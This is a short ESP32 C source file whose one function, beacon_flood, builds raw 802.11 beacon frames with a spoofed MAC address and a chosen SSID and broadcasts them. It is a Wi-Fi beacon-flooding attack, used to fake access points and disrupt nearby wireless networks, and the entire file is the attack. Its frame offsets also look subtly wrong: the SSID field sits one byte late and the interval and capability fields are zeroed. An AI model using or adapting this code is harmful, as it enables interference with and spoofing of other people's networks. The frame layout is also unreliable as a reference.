#include "esp_wifi.h"
#include <string.h>
#include "esp_log.h"

static const char *TAG = "BEACON";

void beacon_flood(char *ssid) {
    uint8_t frame[128] = {0};
    frame[0] = 0x80;
    frame[1] = 0x00;
    memset(&frame[4], 0xFF, 6);
    frame[10] = 0xAA;
    frame[11] = 0xBB;
    frame[12] = 0xCC;
    frame[13] = 0xDD;
    frame[14] = 0xEE;
    frame[15] = 0xFF;
    memcpy(&frame[16], &frame[10], 6);
    frame[38] = strlen(ssid);
    memcpy(&frame[39], ssid, strlen(ssid));
    
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Failed to send beacon: %d", ret);
    }
}
